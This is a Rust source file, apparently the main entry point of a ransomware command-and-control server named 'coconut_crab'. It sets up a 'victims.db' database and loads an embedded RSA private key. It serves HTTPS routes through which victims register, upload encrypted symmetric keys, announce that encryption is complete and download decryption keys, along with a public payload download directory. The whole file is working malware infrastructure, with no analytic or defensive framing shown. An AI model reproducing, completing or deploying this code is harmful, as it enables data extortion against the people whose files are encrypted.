use axum::{Router, routing::post};
use axum_embed::ServeEmbed;
use axum_server::tls_rustls::RustlsConfig;
use log::{debug, error, info};
use purecrypto::rsa::BoxedRsaPrivateKey;
use rust_embed::RustEmbed;
use std::{future, net::SocketAddr, sync::Arc, time::Duration};
use tokio::signal;

mod config;
mod crypto;
mod extract;
mod handlers;
mod models;
mod time;

use handlers::{announce_completion, download_sym_key, register, upload_sym_key};
use models::Victim;

use coconut_crab_lib::{
    file::get_exe_path_dir,
    web::{
        routes,
        server_tls::{get_tls_private_key, get_tls_public_key},
    },
};

static MIGRATIONS: toasty::migration::MigrationSet = toasty::embed_migrations!();

fn spawn_shutdown_signal(handle: axum_server::Handle<SocketAddr>) {
    tokio::spawn(async move {
        let ctrl_c = async {
            if let Err(error) = signal::ctrl_c().await {
                error!("failed to install Ctrl+C handler: {error}");
                future::pending::<()>().await;
            }
        };

        #[cfg(unix)]
        let terminate = async {
            match signal::unix::signal(signal::unix::SignalKind::terminate()) {
                Ok(mut handler) => {
                    handler.recv().await;
                }
                Err(error) => {
                    error!("failed to install termination signal handler: {error}");
                    future::pending::<()>().await;
                }
            }
        };

        #[cfg(not(unix))]
        let terminate = future::pending::<()>();

        tokio::select! {
            () = ctrl_c => {},
            () = terminate => {},
        }

        info!("Received termination signal, starting graceful shutdown");
        handle.graceful_shutdown(Some(Duration::from_secs(30)));
    });
}

#[derive(Clone)]
pub(crate) struct AppState {
    db: toasty::Db,
    private_key: Arc<BoxedRsaPrivateKey>,
}

#[derive(RustEmbed, Clone)]
#[folder = "assets/public"]
struct AssetPublic;

#[derive(RustEmbed)]
#[folder = "assets/private"]
struct AssetPrivate;

#[tokio::main]
async fn main() {
    env_logger::Builder::new()
        .filter_level(log::LevelFilter::Info)
        .init();

    let exe_directory_path = get_exe_path_dir().unwrap_or_else(|error| {
        error!("Cannot determine executable directory: {error}");
        std::process::exit(1);
    });

    let driver = toasty_driver_sqlite::Sqlite::open(exe_directory_path.join("victims.db"));
    let db = toasty::Db::builder()
        .models(toasty::models!(Victim))
        .build(driver)
        .await
        .expect("Failed to connect to SQLite database");

    MIGRATIONS
        .apply(&db)
        .await
        .expect("Failed to apply database migrations");
    debug!("Database migrations applied");

    let pem = String::from_utf8(
        AssetPrivate::get("asym-priv-key.pem")
            .expect("Failed to get private RSA key file")
            .data
            .into_owned(),
    )
    .expect("Failed to read PEM file");
    let private_key =
        Arc::new(BoxedRsaPrivateKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM key"));
    debug!("RSA private key parsed and cached");

    let shared_state = AppState { db, private_key };

    let serve_public_assets = ServeEmbed::<AssetPublic>::new();

    let app = Router::new()
        .route(routes::REGISTER.as_str(), post(register))
        .route(routes::UPLOAD_SYM_KEY.as_str(), post(upload_sym_key))
        .route(
            routes::ANNOUNCE_COMPLETION.as_str(),
            post(announce_completion),
        )
        .route(routes::DOWNLOAD_SYM_KEY.as_str(), post(download_sym_key))
        .nest_service(routes::DOWNLOAD_DIR.as_str(), serve_public_assets)
        .with_state(shared_state);

    let handle = axum_server::Handle::new();
    spawn_shutdown_signal(handle.clone());

    let addr = SocketAddr::from(([0, 0, 0, 0], config::PORT));

    if config::HTTPS {
        rustls::crypto::ring::default_provider()
            .install_default()
            .expect("Failed to install rustls crypto provider");
        let tls_config = RustlsConfig::from_pem(
            get_tls_public_key().into_owned(),
            get_tls_private_key().into_owned(),
        )
        .await
        .expect("Failed to configure web server TLS");

        let server = axum_server::bind_rustls(addr, tls_config);
        server
            .handle(handle)
            .serve(app.into_make_service())
            .await
            .expect("Failed to start web server");
    } else {
        let server = axum_server::bind(addr);
        server
            .handle(handle)
            .serve(app.into_make_service())
            .await
            .expect("Failed to start web server");
    }
}
